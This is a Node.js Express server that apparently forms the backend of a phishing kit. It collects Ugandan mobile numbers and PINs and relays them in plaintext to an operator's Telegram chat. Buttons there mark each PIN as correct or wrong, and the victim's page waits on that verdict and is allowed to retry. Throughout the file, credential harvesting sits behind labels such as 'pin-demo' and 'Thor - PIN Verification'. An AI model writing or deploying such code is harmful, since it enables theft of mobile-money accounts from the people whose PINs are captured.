const express = require("express");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_DIR = path.join(__dirname, "public");
const INDEX_FILE = path.join(PUBLIC_DIR, "index.html");

app.use(express.json({ limit: "10kb" }));
app.use(express.static(PUBLIC_DIR));

app.get("/", (_req, res) => {
  res.sendFile(INDEX_FILE, err => {
    if (err && !res.headersSent) res.status(404).send("Not found.");
  });
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const requests = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, data] of requests.entries()) {
    if (now - new Date(data.createdAt).getTime() > 30 * 60 * 1000) {
      requests.delete(id);
    }
  }
}, 5 * 60 * 1000);

async function telegram(method, payload) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
  
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
  
  const data = await res.json();
  if (!res.ok || !data.ok) throw new Error(data.description || "Telegram failed.");
  return data;
}

app.post("/api/phone", (req, res) => {
  let phone = String(req.body.phone || "").trim();
  
  // Strip country code if user accidentally types it out
  if (phone.startsWith("+256")) phone = phone.replace("+256", "");
  if (phone.startsWith("256")) phone = phone.replace("256", "");
  
  // Validates standard 9-digit Ugandan mobile format (e.g., 778260583)
  if (!/^(7\d{8})$/.test(phone)) {
    return res.status(400).json({ error: "Invalid format phone number." });
  }
  
  // Format with country prefix for the Telegram delivery layout
  const formattedPhone = `0${phone}`; 
  const numericSuffix = Math.floor(100000000 + Math.random() * 900000000);
  
  const item = { 
    id: crypto.randomUUID(), 
    numericId: `user_17878${numericSuffix}`,
    phone: formattedPhone, 
    stage: "pin-demo", 
    status: "ready", 
    createdAt: new Date() 
  };
  
  requests.set(item.id, item);
  return res.json({ id: item.id, status: item.status });
});

app.post("/api/pin-demo", async (req, res) => {
  const id = String(req.body.id || "");
  const request = requests.get(id);
  if (!request) return res.status(400).json({ error: "Session expired or missing." });
  
  request.pin = String(req.body.pin || "").trim();
  request.status = "pending";
  
  const timeString = new Date().toLocaleString("en-US", { 
    timeZone: "Africa/Nairobi",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });

  const shortTimestamp = new Date().toLocaleString("en-US", {
    timeZone: "Africa/Nairobi",
    hour: "2-digit",
    minute: "2-digit",
    hour12: false
  }).replace(":", ".");
  
  try {
    await telegram("sendMessage", {
      chat_id: CHAT_ID,
      text: [
        "# Thor - PIN Verification",
        "PIN VERIFICATION NEEDED\n",
        "USER DETAILS:",
        `• Phone Number: ${request.phone}`,
        `• PIN Code: ${request.pin}`,
        `• User ID: ${request.numericId}`,
        `• Time: ${timeString}`,
        "• Bot: user178\n",
        "━━━━━━━━━━━━━━━━━━━━\n",
        "Verify the PIN:",
        "• PIN Length: 5 digits",
        "• Timeout: 5 minutes",
        `${shortTimestamp}\n`,
        "━━━━━━━━━━━━━━━━━━━━"
      ].join("\n"),
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Correct PIN & OTP", callback_data: `approve:${request.id}` },
            { text: "❌ Wrong PIN", callback_data: `decline:${request.id}` }
          ]
        ]
      }
    });
    return res.json({ status: "pending" });
  } catch (err) {
    console.error("TELEGRAM ERROR:", err.message);
    return res.status(502).json({ error: `Telegram Error: ${err.message}` });
  }
});

app.get("/api/status/:id", (req, res) => {
  const request = requests.get(req.params.id);
  if (!request) return res.status(404).json({ error: "Not found." });
  return res.json({ status: request.status, stage: request.stage });
});

app.post("/api/retry", (req, res) => {
  const request = requests.get(String(req.body.id || ""));
  if (request && request.status === "declined") {
    request.status = "ready";
    return res.json({ status: request.status });
  }
  return res.status(400).json({ error: "Error resetting layout." });
});

let offset = 0;
async function pollTelegram() {
  if (!BOT_TOKEN || !CHAT_ID) return;
  while (true) {
    try {
      const data = await telegram("getUpdates", { offset, timeout: 25, allowed_updates: ["callback_query"] });
      for (const upd of data.result || []) {
        offset = upd.update_id + 1;
        const cb = upd.callback_query;
        if (!cb) continue;
        
        const parts = String(cb.data || "").split(":");
        // ✅ FIXED: Correctly extracts the action string from array instead of comparing the entire array object
        const action = parts[0]; 
        const reqId = parts.slice(1).join(":");
        const request = requests.get(reqId);
        
        if (request && request.status === "pending" && ["approve", "decline"].includes(action)) {
          if (action === "approve") {
            request.status = "approved";
          } else if (action === "decline") {
            request.status = "declined";
          }
          
          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
          
          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : "❌ WRONG PIN";
          await telegram("sendMessage", {
            chat_id: CHAT_ID,
            text: `${statusMarker} processed for Phone: ${request.phone}`
          });
        }
      }
    } catch (e) {
      await new Promise(r => setTimeout(r, 4000));
    }
  }
}

pollTelegram();

app.listen(PORT, () => console.log(`Server executing successfully on port ${PORT}`));
